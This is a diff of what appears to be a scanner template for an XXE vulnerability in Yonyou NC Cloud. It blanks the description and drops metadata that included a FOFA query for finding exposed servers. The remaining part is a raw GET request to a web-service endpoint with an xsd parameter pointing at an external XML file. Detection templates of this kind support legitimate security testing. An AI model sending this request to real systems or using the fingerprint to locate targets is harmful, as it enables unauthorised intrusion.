@@ -3,12 +3,8 @@ info:
   name: 用友NC Cloud INtbOBAWebService XXE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wfpzydz5lotb7eft'
+  description: ''
   tags: xxe,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: wfpzydz5lotb7eft
-    fofa: body="/Client/Uclient/UClient.exe"||body="ufida.ico"||body="nccloud"||body="/api/uclient/public/"
 http:
 - raw:
   - 'GET /uapws/service/nc.itf.tb.oba.INtbOBAWebService?xsd=http://www.baidu.com/win2.xml HTTP/1.1
